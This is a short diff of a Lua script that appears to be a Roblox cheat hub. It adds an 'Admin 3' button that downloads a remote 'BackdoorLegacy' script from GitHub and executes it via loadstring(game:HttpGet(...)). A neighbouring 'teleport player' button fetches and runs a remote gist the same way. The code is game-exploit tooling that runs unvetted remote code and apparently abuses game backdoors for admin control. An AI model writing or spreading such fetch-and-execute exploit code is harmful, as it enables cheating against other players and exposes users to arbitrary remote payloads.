@@ -454,6 +454,13 @@ Tab:AddButton({
 })
 
 Tab:AddButton({
+	Name = "管理员3",
+	Callback = function()
+     loadstring(game:HttpGet('https://raw.githubusercontent.com/IvanTheProtogen/BackdoorLegacy/main/main.lua'))()
+  	end    
+})
+
+Tab:AddButton({
 	Name = "传送玩家",
 	Callback = function()
      loadstring(game:HttpGet("https://gist.githubusercontent.com/DagerFild/b4776075a0d26ef04394133ee6bd2081/raw/0ed51ac94057d2d9a9f00e1b037b9011c76ca54a/tpGUI", true))()
